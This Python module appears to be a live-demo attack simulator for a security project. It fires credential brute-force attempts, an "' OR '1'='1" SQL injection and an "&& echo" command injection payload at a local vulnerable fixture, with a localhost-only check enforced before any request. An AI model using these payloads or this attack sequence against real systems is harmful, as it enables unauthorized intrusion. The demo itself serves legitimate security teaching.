"""Real-time HTTP attack simulator for WASP live demos.

Fires real HTTP requests, over the network, at a local vulnerable target
(tests/fixtures/vuln_sample_repo/server.py) to demonstrate -- live -- three
attack vectors: credential brute force, SQL injection, and OS command
injection. Every step is appended to the tamper-evident ledger
(centinela/ledger/hash_chain.py, entry_type="attack") as soon as it
finishes, and optionally streamed to a caller-supplied `on_step` callback
so a console script, a Telegram bot, or a dashboard can show progress live
without this module knowing anything about how that progress gets shown.

SAFETY (non-negotiable): run_attack() only ever attacks localhost. The
target host is parsed and validated *before* any request is issued -- this
is enforced in code, not just documented, and a non-local host raises
ValueError immediately with zero network traffic sent.
"""

import time
import urllib.parse

import httpx

from centinela.ledger import hash_chain

DEFAULT_TARGET_URL = "http://127.0.0.1:8899"
DEFAULT_LEDGER_PATH = "centinela/data/ledger.jsonl"

_ALLOWED_HOSTS = {"localhost", "127.0.0.1", "::1"}

# Short list of common weak credentials for the brute-force demo.
BRUTE_FORCE_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "123456"),
    ("admin", "password"),
    ("admin", "admin123"),
    ("admin", "letmein"),
    ("root", "root"),
    ("root", "toor"),
    ("admin", "qwerty"),
]

SQLI_PAYLOAD = "' OR '1'='1"
CMDI_PAYLOAD = "127.0.0.1 && echo WASP_PWNED"

STEP_COUNT = 3


def _assert_local_target(target_url: str) -> None:
    """Raise ValueError if target_url does not point at localhost.

    Runs before any request is made. This is the hard safety boundary:
    this simulator is a demo tool against a self-owned, controlled target,
    not a general-purpose offensive tool.
    """
    parsed = urllib.parse.urlparse(target_url)
    host = (parsed.hostname or "").lower()
    if host not in _ALLOWED_HOSTS:
        raise ValueError(
            f"run_attack: refusing to attack '{host or target_url}'. "
            "This simulator only targets localhost/127.0.0.1/::1 by design "
            "-- pass a localhost target_url."
        )


def _log_and_emit(vector, payload, success, evidence, target_url, ledger_path, on_step):
    entry = hash_chain.append(
        "attack",
        {
            "vector": vector,
            "payload": payload,
            "success": success,
            "evidence": evidence,
            "target": target_url,
        },
        ledger_path=ledger_path,
    )
    step_result = dict(entry["data"])
    step_result["ledger_index"] = entry["index"]
    if on_step is not None:
        on_step(step_result)
    return step_result


def _brute_force(client, target_url, ledger_path, on_step):
    for username, password in BRUTE_FORCE_CREDENTIALS:
        resp = client.post(
            f"{target_url}/login", json={"username": username, "password": password}
        )
        data = resp.json() if resp.status_code == 200 else {}
        if data.get("success"):
            return _log_and_emit(
                "fuerza_bruta",
                {"username": username, "password": password},
                True,
                f"login exitoso con {username}/{password}",
                target_url,
                ledger_path,
                on_step,
            )
    return _log_and_emit(
        "fuerza_bruta",
        {"attempts": [f"{u}/{p}" for u, p in BRUTE_FORCE_CREDENTIALS]},
        False,
        "ninguna combinacion de la lista funciono",
        target_url,
        ledger_path,
        on_step,
    )


def _sql_injection(client, target_url, ledger_path, on_step):
    resp = client.get(f"{target_url}/user", params={"username": SQLI_PAYLOAD})
    rows = []
    if resp.status_code == 200:
        rows = resp.json().get("rows", [])
    success = len(rows) > 1
    if success:
        evidence = f"la inyeccion devolvio {len(rows)} filas (toda la tabla) en vez de una sola"
    else:
        evidence = f"la respuesta trajo {len(rows)} fila(s), no hay evidencia de inyeccion"
    return _log_and_emit(
        "sql_injection", SQLI_PAYLOAD, success, evidence, target_url, ledger_path, on_step
    )


def _command_injection(client, target_url, ledger_path, on_step):
    resp = client.get(f"{target_url}/ping", params={"host": CMDI_PAYLOAD})
    body = resp.text
    success = "WASP_PWNED" in body
    if success:
        evidence = "'WASP_PWNED' aparecio en la respuesta: se ejecuto un comando extra ademas del ping"
    else:
        evidence = "'WASP_PWNED' no aparecio en la respuesta"
    return _log_and_emit(
        "command_injection", CMDI_PAYLOAD, success, evidence, target_url, ledger_path, on_step
    )


def run_attack(
    target_url: str = DEFAULT_TARGET_URL,
    ledger_path: str = DEFAULT_LEDGER_PATH,
    on_step=None,
) -> list:
    """Run the 3-vector attack sequence against target_url, in order.

    Each step is logged to the ledger and (if on_step is given) passed to
    on_step(step_result) the moment it finishes -- not batched at the end
    -- with a short pause between steps so the sequence reads as "live".

    Raises ValueError immediately, before any request, if target_url does
    not resolve to localhost/127.0.0.1/::1.
    """
    _assert_local_target(target_url)

    steps = []
    with httpx.Client(timeout=10.0) as client:
        steps.append(_brute_force(client, target_url, ledger_path, on_step))
        time.sleep(0.5)
        steps.append(_sql_injection(client, target_url, ledger_path, on_step))
        time.sleep(0.5)
        steps.append(_command_injection(client, target_url, ledger_path, on_step))

    return steps
